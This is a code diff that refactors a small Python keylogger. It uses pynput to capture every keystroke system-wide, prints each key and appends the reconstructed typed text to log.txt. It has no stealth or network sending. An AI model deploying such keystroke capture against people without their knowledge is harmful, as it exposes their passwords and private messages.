@@ -1,38 +1,52 @@
 from typing import List
 import pynput
-from pynput.keyboard import Key, Listener
 
+# Define constants
+LOG_FILE = "log.txt"
+MAX_KEYS = 10
+
+# Initialize key counter and list of keys
 count = 0
 keys = []
 
 
 def on_press(key):
     global keys, count
+
+    # Append key to list and increment counter
     keys.append(key)
     count += 1
-    print("{0} pressed".format(key))
 
-    if count >= 10:
-        count = 0
+    # Print key to console
+    print(f"Pressed: {key}")
+
+    # Write keys to file if count threshold is reached
+    if count >= MAX_KEYS:
         write_file(keys)
         keys = []
+        count = 0
 
 
 def write_file(keys):
-    with open("log.txt", "a") as f:
+    with open(LOG_FILE, "a") as f:
+        words = []
         for key in keys:
             k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                # f.write(str(key))
-                f.write('\n')
+            if k == "Key.enter":
+                f.write("".join(words) + "\n\n")
+                words = []
+            elif k == "Key.space":
+                words.append(" ")
             elif k.find("Key") == -1:
-                f.write(k)
+                words.append(k)
+        f.write("".join(words))
 
 
 def on_release(key):
-    if key == Key.esc:
+    if key == pynput.keyboard.Key.esc:
         return False
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
+# Start listener
+with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
